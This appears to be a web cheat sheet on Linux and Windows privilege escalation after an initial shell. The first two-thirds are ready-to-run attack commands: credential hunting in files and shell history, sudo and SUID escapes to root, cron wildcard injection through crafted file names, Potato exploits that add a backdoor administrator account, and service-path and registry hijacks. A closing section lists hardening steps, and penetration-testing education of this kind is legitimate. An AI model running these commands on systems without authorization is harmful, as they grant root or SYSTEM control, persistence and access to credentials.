OS Privilege Escalation

Post-exploitation · Linux & Windows · Go from low-privilege shell to root/SYSTEM using misconfigurations, weak permissions, and vulnerable services

Privilege escalation moves from a limited shell to root/SYSTEM. The methodology is identical on both OSes: enumerate misconfigurations, find weak permissions, exploit trust relationships. Automated scripts do the heavy lifting — understanding the techniques lets you exploit manually when tools are blocked.

First-steps enumeration — run immediately after getting a shell
whoami && id # who am I? hostname && uname -a # OS + kernel version sudo -l # what can I run as sudo? find / -perm -4000 2>/dev/null # SUID binaries cat /etc/crontab; ls /etc/cron* # scheduled tasks env; cat ~/.bash_history # env vars + previous commands grep -rn "password" /var/www/ /opt/ 2>/dev/null # credentials in files netstat -tnlp # internal-only services ps aux # what else runs as root? # Windows: whoami /priv # check SeImpersonatePrivilege wmic service get name,pathname # unquoted service paths systeminfo # OS version + hotfixes

① Sudo misconfigurationCheck first — most common

sudo -l reveals what you can run as root. Almost any binary escalates via GTFOBins (gtfobins.github.io).

sudo -l # Exploitable examples: (root) NOPASSWD: /usr/bin/vim → sudo vim -c ':!/bin/bash' (root) NOPASSWD: /usr/bin/find → sudo find / -exec /bin/bash \; -quit (root) NOPASSWD: /usr/bin/python3 → sudo python3 -c 'import os;os.system("/bin/bash")' (root) NOPASSWD: /usr/bin/awk → sudo awk 'BEGIN {system("/bin/bash")}' (root) NOPASSWD: /usr/bin/less → sudo less /etc/passwd then type: !/bin/bash (root) NOPASSWD: /usr/bin/tar → sudo tar cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash (root) NOPASSWD: ALL → sudo su
② SUID binaries + PATH hijackingHigh
find / -perm -4000 -type f 2>/dev/null # Non-standard SUID = investigate. Check what it calls: strings /usr/local/bin/custom_tool | grep -v "^$" # If calls "service" or "python" without full path: echo '#!/bin/bash' > /tmp/service echo 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' >> /tmp/service chmod +x /tmp/service export PATH=/tmp:$PATH /usr/local/bin/custom_tool # runs fake "service" as root! /tmp/rootbash -p # root shell
③ Cron job exploitationHigh
cat /etc/crontab; ls /etc/cron.d/ # Scenario 1: writable script * * * * * root /opt/cleanup.sh ls -la /opt/cleanup.sh # -rwxrwxrwx = world-writable! echo 'cp /bin/bash /tmp/rb; chmod +s /tmp/rb' >> /opt/cleanup.sh # wait 60s, then: /tmp/rb -p # Scenario 2: wildcard injection (tar *) * * * * * root cd /backups && tar czf backup.tgz * echo '' > '/backups/--checkpoint=1' echo '' > '/backups/--checkpoint-action=exec=sh privesc.sh' echo 'cp /bin/bash /tmp/rb; chmod +s /tmp/rb' > /backups/privesc.sh # pspy64 — monitor cron WITHOUT root ./pspy64 # shows every root process with timestamps

① SeImpersonatePrivilege — Potato attacksCommon on service accounts

IIS, MSSQL, and service accounts almost always have this privilege. Potato attacks forge a SYSTEM token.

whoami /priv # Look for: SeImpersonatePrivilege = Enabled # GodPotato — works Windows Server 2012 through 2022 GodPotato.exe -cmd "cmd /c net user hacker Pass123! /add" GodPotato.exe -cmd "cmd /c net localgroup Administrators hacker /add" # PrintSpoofer — Windows 10 / Server 2019+ PrintSpoofer.exe -i -c cmd.exe # JuicyPotato — Windows Server 2016 and below JuicyPotato.exe -l 1337 -p cmd.exe -a "/c whoami" -t *
② Unquoted service pathsVery common
wmic service get name,pathname # Look for paths with spaces but NO quotes # e.g.: C:\Program Files\My App\svc.exe (vulnerable) # vs: "C:\Program Files\My App\svc.exe" (safe) # Windows tries paths in order: # C:\Program.exe <-- if writable, place payload here # C:\Program Files\My.exe <-- or here icacls "C:\Program Files" # check write permissions # If writable: copy shell.exe "C:\Program Files\My.exe" sc stop VulnSvc && sc start VulnSvc # trigger SYSTEM execution
③ Weak service/registry permissionsHigh
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula # If service binary is writable — replace with payload # If service registry key is writable: reg add HKLM\SYSTEM\CurrentControlSet\Services\VulnSvc /v ImagePath /t REG_EXPAND_SZ /d "C:\Windows\Temp\shell.exe" /f sc stop VulnSvc && sc start VulnSvc

① Restrict sudo to exact commands needed Highest Linux impact
Never grant NOPASSWD: ALL. Any interpreter, text editor, or system tool in sudoers is a GTFOBins escape waiting to happen.
# BAD: www-data ALL=(ALL) NOPASSWD: ALL # GOOD — exact absolute path only: www-data ALL=(root) NOPASSWD: /usr/bin/certbot renew --quiet # High-risk in sudoers: vim nano python perl ruby awk find tar less more man zip
② Audit SUID binaries and cron permissions Essential
# Audit SUID find / -perm -4000 -type f 2>/dev/null | xargs ls -la chmod u-s /usr/bin/nmap # remove where not needed # Cron scripts must be root-owned and not world-writable chmod 700 /opt/scripts/cleanup.sh chown root:root /opt/scripts/cleanup.sh
③ Windows — fix service misconfigs Essential
# Quote all service paths sc config VulnSvc binPath= "\"C:\Program Files\My App\svc.exe\"" # Disable AlwaysInstallElevated reg add HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated /t REG_DWORD /d 0 /f reg add HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated /t REG_DWORD /d 0 /f # Keep patched — Potato attacks are mitigated on modern patched Windows # Restrict SeImpersonatePrivilege to actual service accounts via Group Policy
④ Ongoing hardening
Run LinPEAS/WinPEAS on your own systems quarterly  ·  No plaintext credentials in config files — use secrets managers  ·  Service accounts: minimal OS privileges, no admin group membership  ·  Enable auditd (Linux) / Windows Event Log 4688 — log all process execution  ·  Patch kernels and OS promptly — most kernel exploits have CVEs with available patches
